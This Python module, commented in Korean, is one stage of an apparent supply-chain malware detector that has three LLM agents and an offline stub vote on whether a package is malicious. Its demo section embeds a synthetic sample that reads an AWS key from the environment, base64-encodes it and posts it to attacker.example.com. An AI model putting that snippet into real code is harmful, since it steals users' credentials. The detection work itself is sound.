"""
Stage 5 Multi-Agent — LLM 다중 에이전트 합의(consensus) 기반 검증.

근거 논문:
  LAMPS: Multi-Agent LLM for Malicious Package Detection (2025)
  https://arxiv.org/html/2601.12148v1

설계:
  단일 LLM 호출 대신 세 가지 시각의 에이전트를 호출하고
  consensus 로직으로 최종 판정을 도출한다.

  ┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐
  │ semantic_agent   │   │ diff_agent       │   │ dependency_agent │
  │ (코드 의미 분석) │   │ (버전 차이 해석) │   │ (의존성 리뷰)   │
  └────────┬─────────┘   └────────┬─────────┘   └────────┬─────────┘
           │                      │                      │
           └──────────────────────┴──────────────────────┘
                                  │
                                  ▼
                     ┌─────────────────────────┐
                     │   consensus / vote      │
                     └─────────────────────────┘

각 에이전트는 LLMResponse(verdict, reasoning, evidence) 를 반환.

API 키 없을 때 stub 모드로 동작 — 결정적 규칙으로 합의를 시뮬레이션.
"""
from __future__ import annotations

import json
import os
from dataclasses import dataclass, field
from typing import Literal

from ..schema import LLMVerdict
from .stage2_behavior import FileSequence
from .stage4_ttp_match import TTPMatch
from .stage5_llm_review import LLMResponse, _call_claude, _parse_llm_json


# ─────────────── 에이전트 결과 ───────────────

@dataclass
class AgentReport:
    """단일 에이전트의 판정."""
    name: str
    verdict: LLMVerdict
    reasoning: str
    most_convincing_evidence: str
    confidence: float = 0.0  # 0.0 ~ 1.0

    def to_dict(self) -> dict:
        return {
            "agent": self.name,
            "verdict": self.verdict.value,
            "reasoning": self.reasoning,
            "evidence": self.most_convincing_evidence,
            "confidence": round(self.confidence, 3),
        }


@dataclass
class ConsensusReport:
    """세 에이전트의 합의 결과."""
    verdict: LLMVerdict           # 최종 판정
    reasoning: str                # 합의 설명
    agent_reports: list[AgentReport] = field(default_factory=list)
    agreement_ratio: float = 0.0  # 동의율 (0.0 ~ 1.0)
    model: str = "multi-agent"

    def to_dict(self) -> dict:
        return {
            "verdict": self.verdict.value,
            "reasoning": self.reasoning,
            "agreement_ratio": round(self.agreement_ratio, 3),
            "agents": [a.to_dict() for a in self.agent_reports],
            "model": self.model,
        }


# ─────────────── 시스템 프롬프트 ───────────────

_SYSTEM_BASE = (
    "You are a software supply chain security analyst. "
    "Reply MUST be valid JSON with keys: "
    "verdict (malicious | suspicious | benign), "
    "reasoning (string), "
    "most_convincing_evidence (string). "
    "No other output."
)

SEMANTIC_SYSTEM = (
    _SYSTEM_BASE
    + " Focus: code semantics. Determine if the behavior sequence and "
    "taint flows describe credential theft, remote execution, or "
    "exfiltration. Ignore version history."
)

DIFF_SYSTEM = (
    _SYSTEM_BASE
    + " Focus: version diff. Determine if the changes between versions "
    "introduce malicious behavior (event-stream / ua-parser style attack). "
    "If no diff is provided, reply benign with low confidence."
)

DEPENDENCY_SYSTEM = (
    _SYSTEM_BASE
    + " Focus: declared dependencies. Determine if the dependency list "
    "is suspicious (e.g. unusual deps for the package's stated purpose, "
    "typosquat-style names, runtime-installed deps). "
    "If no dependency list is provided, reply benign with low confidence."
)


# ─────────────── 프롬프트 빌더 ───────────────

def _build_semantic_prompt(
    package: str,
    version: str,
    ecosystem: str,
    file_seq: FileSequence,
    ttp_matches: list[TTPMatch],
    code_snippet: str,
    taint_slice: str | None,
) -> str:
    ttp_lines = []
    for m in ttp_matches[:5]:
        ttp_lines.append(
            f"- {m.ttp.ttp_id} ({m.ttp.ttp_source.value}): {m.ttp.ttp_name} "
            f"(sim {m.similarity:.2f}, sev {m.ttp.severity.value})"
        )
    ttp_block = "\n".join(ttp_lines) if ttp_lines else "(none)"

    if taint_slice and taint_slice.strip():
        evidence_label = "Taint flows (source -> sink):"
        evidence_body = taint_slice[:1800]
    else:
        evidence_label = "Code snippet:"
        evidence_body = code_snippet[:1500]

    return f"""Package: {package} {version} ({ecosystem})

File: {file_seq.path}
Behavior sequence: {' -> '.join(file_seq.sequence)}
Dimensions: {', '.join(d.value for d in file_seq.dimensions)}

Matched TTPs:
{ttp_block}

{evidence_label}
```
{evidence_body}
```

Reply with JSON only."""


def _build_diff_prompt(
    package: str,
    version: str,
    ecosystem: str,
    version_diff_summary: str | None,
    new_apis: list[str] | None,
) -> str:
    diff_block = version_diff_summary or "(no version diff data)"
    apis = ", ".join(new_apis or []) or "(none)"
    return f"""Package: {package} {version} ({ecosystem})

Version diff summary: {diff_block}
Newly introduced API calls: {apis}

Question: Does this diff introduce malicious behavior?

Reply with JSON only."""


def _build_dependency_prompt(
    package: str,
    version: str,
    ecosystem: str,
    description: str,
    declared_deps: list[str],
) -> str:
    desc = (description or "(no description)")[:300]
    deps = ", ".join(declared_deps) if declared_deps else "(none)"
    return f"""Package: {package} {version} ({ecosystem})

Stated description: {desc}

Declared dependencies: {deps}

Question: Are the declared dependencies coherent with the stated purpose, or do they suggest hidden malicious intent?

Reply with JSON only."""


# ─────────────── Claude 호출 ───────────────

def _run_agent_claude(
    name: str,
    system: str,
    user: str,
    model: str,
) -> AgentReport:
    raw = _call_claude(system, user, model)
    try:
        parsed = _parse_llm_json(raw)
    except Exception as e:
        return AgentReport(
            name=name,
            verdict=LLMVerdict.BENIGN,
            reasoning=f"parse-error: {e}",
            most_convincing_evidence=raw[:200],
            confidence=0.0,
        )
    verdict_raw = (parsed.get("verdict") or "benign").lower()
    if verdict_raw not in ("malicious", "suspicious", "benign"):
        verdict_raw = "benign"
    return AgentReport(
        name=name,
        verdict=LLMVerdict(verdict_raw),
        reasoning=parsed.get("reasoning", ""),
        most_convincing_evidence=parsed.get("most_convincing_evidence", ""),
        confidence={
            "malicious": 0.9, "suspicious": 0.6, "benign": 0.3
        }.get(verdict_raw, 0.3),
    )


# ─────────────── Stub (오프라인 모드) ───────────────

def _stub_semantic(file_seq: FileSequence, ttp_matches: list[TTPMatch], taint_slice: str | None) -> AgentReport:
    """taint slice + dimensions 기반 결정적 stub."""
    from ..schema import AttackDimension

    dims = set(file_seq.dimensions)
    creds_combo = {
        AttackDimension.INFORMATION_READING,
        AttackDimension.ENCODING,
        AttackDimension.DATA_TRANSMISSION,
    }
    remote_exec = {
        AttackDimension.DATA_TRANSMISSION,
        AttackDimension.PAYLOAD_EXECUTION,
    }
    is_install_hook = any(
        kw in file_seq.path.lower()
        for kw in ("setup.py", "postinstall", "preinstall")
    )
    has_taint = bool(taint_slice and taint_slice.strip())

    if (creds_combo.issubset(dims) and is_install_hook) or (
        creds_combo.issubset(dims) and has_taint
    ):
        return AgentReport(
            name="semantic_agent",
            verdict=LLMVerdict.MALICIOUS,
            reasoning="Stub: credential 탈취 체인이 설치 훅 또는 taint flow 로 확인됨.",
            most_convincing_evidence=f"file={file_seq.path}",
            confidence=0.9,
        )
    if creds_combo.issubset(dims):
        return AgentReport(
            name="semantic_agent",
            verdict=LLMVerdict.SUSPICIOUS,
            reasoning="Stub: info-read + encode + send 조합 등장 (설치훅 아님).",
            most_convincing_evidence=f"file={file_seq.path}",
            confidence=0.6,
        )
    if remote_exec.issubset(dims) and is_install_hook:
        return AgentReport(
            name="semantic_agent",
            verdict=LLMVerdict.SUSPICIOUS,
            reasoning="Stub: 설치 훅에 network + execution 조합.",
            most_convincing_evidence=f"file={file_seq.path}",
            confidence=0.65,
        )
    return AgentReport(
        name="semantic_agent",
        verdict=LLMVerdict.BENIGN,
        reasoning="Stub: 명확한 공격 시퀀스 없음.",
        most_convincing_evidence="none",
        confidence=0.4,
    )


def _stub_diff(version_diff_summary: str | None, new_apis: list[str] | None) -> AgentReport:
    summ = version_diff_summary or ""
    apis = new_apis or []

    high_risk_keywords = ("severity HIGH", "exec", "eval", "subprocess", "post", "child_process")
    has_high = any(k.lower() in summ.lower() for k in high_risk_keywords) or any(
        any(k in api for k in ("exec", "eval", "Popen", "system", "post")) for api in apis
    )
    if has_high:
        return AgentReport(
            name="diff_agent",
            verdict=LLMVerdict.SUSPICIOUS,
            reasoning="Stub: 신규 버전에서 위험 API 도입 가능성.",
            most_convincing_evidence=summ[:200],
            confidence=0.65,
        )
    if not summ:
        return AgentReport(
            name="diff_agent",
            verdict=LLMVerdict.BENIGN,
            reasoning="Stub: 버전 diff 정보 없음.",
            most_convincing_evidence="(no diff)",
            confidence=0.3,
        )
    return AgentReport(
        name="diff_agent",
        verdict=LLMVerdict.BENIGN,
        reasoning="Stub: 버전 diff 에 명확한 위험 신호 없음.",
        most_convincing_evidence=summ[:200],
        confidence=0.4,
    )


def _stub_dependency(description: str, declared_deps: list[str]) -> AgentReport:
    desc = (description or "").lower()
    deps_lower = [d.lower() for d in declared_deps]

    # 매우 단순한 일관성 검사
    parser_like = any(d in deps_lower for d in ("requests", "psutil", "cryptography", "discord-webhook"))
    very_short_desc = len(desc.strip()) < 25

    suspicious = (
        very_short_desc and parser_like
    ) or (
        # JSON parser 인데 psutil/cryptography 등이 들어있는 경우
        ("json" in desc or "parser" in desc or "format" in desc)
        and any(d in deps_lower for d in ("psutil", "cryptography", "requests"))
    )

    if suspicious:
        return AgentReport(
            name="dependency_agent",
            verdict=LLMVerdict.SUSPICIOUS,
            reasoning="Stub: 의존성과 패키지 설명의 정합성이 낮음.",
            most_convincing_evidence=f"desc={desc[:80]} | deps={deps_lower}",
            confidence=0.55,
        )
    if not declared_deps:
        return AgentReport(
            name="dependency_agent",
            verdict=LLMVerdict.BENIGN,
            reasoning="Stub: 의존성 정보 없음 또는 비어 있음.",
            most_convincing_evidence="(no deps)",
            confidence=0.3,
        )
    return AgentReport(
        name="dependency_agent",
        verdict=LLMVerdict.BENIGN,
        reasoning="Stub: 의존성 일관성에 큰 이상 없음.",
        most_convincing_evidence=f"deps={deps_lower}",
        confidence=0.4,
    )


# ─────────────── Consensus ───────────────

_VERDICT_RANK = {
    LLMVerdict.BENIGN: 0,
    LLMVerdict.SUSPICIOUS: 1,
    LLMVerdict.MALICIOUS: 2,
}

_RANK_VERDICT = {v: k for k, v in _VERDICT_RANK.items()}


def consensus(reports: list[AgentReport]) -> ConsensusReport:
    """세 에이전트의 판정을 합의.

    규칙:
      1. 두 명 이상이 MALICIOUS → MALICIOUS
      2. 한 명이 MALICIOUS + 한 명 이상 SUSPICIOUS → MALICIOUS
      3. 두 명 이상이 SUSPICIOUS 이상 → SUSPICIOUS
      4. 그 외 → BENIGN
      5. 동의율(agreement) = (가장 많은 판정 수 / 전체) — UI 표시용
    """
    if not reports:
        return ConsensusReport(
            verdict=LLMVerdict.BENIGN,
            reasoning="No agents reported.",
            agent_reports=[],
            agreement_ratio=0.0,
        )

    n = len(reports)
    counts = {LLMVerdict.MALICIOUS: 0, LLMVerdict.SUSPICIOUS: 0, LLMVerdict.BENIGN: 0}
    for r in reports:
        counts[r.verdict] += 1

    if counts[LLMVerdict.MALICIOUS] >= 2:
        final = LLMVerdict.MALICIOUS
    elif counts[LLMVerdict.MALICIOUS] >= 1 and counts[LLMVerdict.SUSPICIOUS] >= 1:
        final = LLMVerdict.MALICIOUS
    elif (counts[LLMVerdict.MALICIOUS] + counts[LLMVerdict.SUSPICIOUS]) >= 2:
        final = LLMVerdict.SUSPICIOUS
    elif counts[LLMVerdict.MALICIOUS] >= 1:
        # 한 명이라도 malicious 라고 단독 주장 → suspicious 로 보수 처리
        final = LLMVerdict.SUSPICIOUS
    else:
        final = LLMVerdict.BENIGN

    top_count = max(counts.values())
    agreement = top_count / n

    # 합의 설명
    parts = []
    for r in reports:
        parts.append(f"{r.name}={r.verdict.value}({r.confidence:.2f})")
    reason = (
        f"Multi-agent consensus → {final.value} "
        f"(agreement={agreement:.2f}). " + " | ".join(parts)
    )

    return ConsensusReport(
        verdict=final,
        reasoning=reason,
        agent_reports=reports,
        agreement_ratio=agreement,
    )


# ─────────────── 공개 API ───────────────

def review_multi(
    package: str,
    version: str,
    ecosystem: str,
    file_seq: FileSequence,
    ttp_matches: list[TTPMatch],
    code_snippet: str = "",
    version_diff_summary: str | None = None,
    new_apis: list[str] | None = None,
    description: str = "",
    declared_deps: list[str] | None = None,
    taint_slice: str | None = None,
    mode: Literal["claude", "stub"] = "stub",
    model: str = "claude-sonnet-4-5",
) -> ConsensusReport:
    """3개 에이전트를 호출하고 합의."""
    declared_deps = declared_deps or []

    if mode == "stub":
        agents = [
            _stub_semantic(file_seq, ttp_matches, taint_slice),
            _stub_diff(version_diff_summary, new_apis),
            _stub_dependency(description, declared_deps),
        ]
        return consensus(agents)

    # claude 모드
    semantic_user = _build_semantic_prompt(
        package, version, ecosystem,
        file_seq, ttp_matches, code_snippet, taint_slice,
    )
    diff_user = _build_diff_prompt(
        package, version, ecosystem,
        version_diff_summary, new_apis,
    )
    dep_user = _build_dependency_prompt(
        package, version, ecosystem,
        description, declared_deps,
    )

    agents: list[AgentReport] = []
    try:
        agents.append(_run_agent_claude("semantic_agent", SEMANTIC_SYSTEM, semantic_user, model))
    except Exception as e:
        agents.append(AgentReport(
            name="semantic_agent", verdict=LLMVerdict.BENIGN,
            reasoning=f"call-failed: {e}", most_convincing_evidence="",
            confidence=0.0,
        ))
    try:
        agents.append(_run_agent_claude("diff_agent", DIFF_SYSTEM, diff_user, model))
    except Exception as e:
        agents.append(AgentReport(
            name="diff_agent", verdict=LLMVerdict.BENIGN,
            reasoning=f"call-failed: {e}", most_convincing_evidence="",
            confidence=0.0,
        ))
    try:
        agents.append(_run_agent_claude("dependency_agent", DEPENDENCY_SYSTEM, dep_user, model))
    except Exception as e:
        agents.append(AgentReport(
            name="dependency_agent", verdict=LLMVerdict.BENIGN,
            reasoning=f"call-failed: {e}", most_convincing_evidence="",
            confidence=0.0,
        ))
    return consensus(agents)


def consensus_to_llm_response(c: ConsensusReport) -> LLMResponse:
    """기존 Stage 5 인터페이스(LLMResponse)와 호환을 위한 어댑터."""
    most_convincing = ""
    # 최고 confidence 의 에이전트 evidence 채택
    if c.agent_reports:
        top = max(c.agent_reports, key=lambda a: a.confidence)
        most_convincing = f"[{top.name}] {top.most_convincing_evidence}"
    return LLMResponse(
        verdict=c.verdict,
        reasoning=c.reasoning,
        most_convincing_evidence=most_convincing,
        model=c.model,
    )


# ─────────────── CLI ───────────────

if __name__ == "__main__":
    from .stage1_entry_point import EntryFile
    from .stage2_behavior import _analyze_python

    # 합성 악성: env -> base64 -> http.post
    sample = '''
import os, base64, requests
def hack():
    secret = os.environ.get("AWS_KEY")
    payload = base64.b64encode(secret.encode())
    requests.post("https://attacker.example.com", data=payload)
'''
    file_seq = _analyze_python(EntryFile(
        path="evil/setup.py", basename="setup.py",
        content=sample, size=len(sample), language="python",
    ))

    c = review_multi(
        package="evil", version="0.0.1", ecosystem="PyPI",
        file_seq=file_seq, ttp_matches=[],
        code_snippet=sample,
        taint_slice="os.environ.get -> base64.b64encode -> requests.post",
        version_diff_summary="2 file(s) changed, severity HIGH",
        description="json parser",
        declared_deps=["psutil"],
        mode="stub",
    )

    print("=== Consensus ===")
    print(f"verdict        : {c.verdict.value}")
    print(f"agreement_ratio: {c.agreement_ratio:.2f}")
    print(f"reasoning      : {c.reasoning}")
    print()
    for a in c.agent_reports:
        print(f"  [{a.name}] {a.verdict.value} (conf={a.confidence:.2f})")
        print(f"    {a.reasoning}")
        print(f"    evidence: {a.most_convincing_evidence}")
